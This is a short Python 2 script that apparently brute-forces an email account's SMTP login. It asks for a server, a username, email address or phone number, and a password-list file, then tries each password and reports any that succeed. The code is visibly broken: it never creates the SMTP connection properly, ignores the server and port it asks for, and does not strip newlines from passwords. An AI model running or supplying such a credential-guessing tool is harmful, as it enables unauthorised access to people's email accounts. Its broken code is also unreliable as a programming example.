#!/usr/bin/python
#
#
import smtplib
import os
import sys

#Imput for smtp server
#and port
#

smtpserver = smtplib.SMTP 
smtpserver.ehlo()
smtpserver.starttls()

server = raw_input("enter the smtp server address: ")
server_port = raw_input("enter server port: ")

user = raw_input("Please Enter One Of The Following:|[User Name]|[Email-Address]|[Cell-Phone-Number]|: ")
pass_file = raw_input("Please Enter The Path To PassWordLists: ")


pass_file = open(pass_file, "r")

for password in pass_file:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Not Found: %s" % password
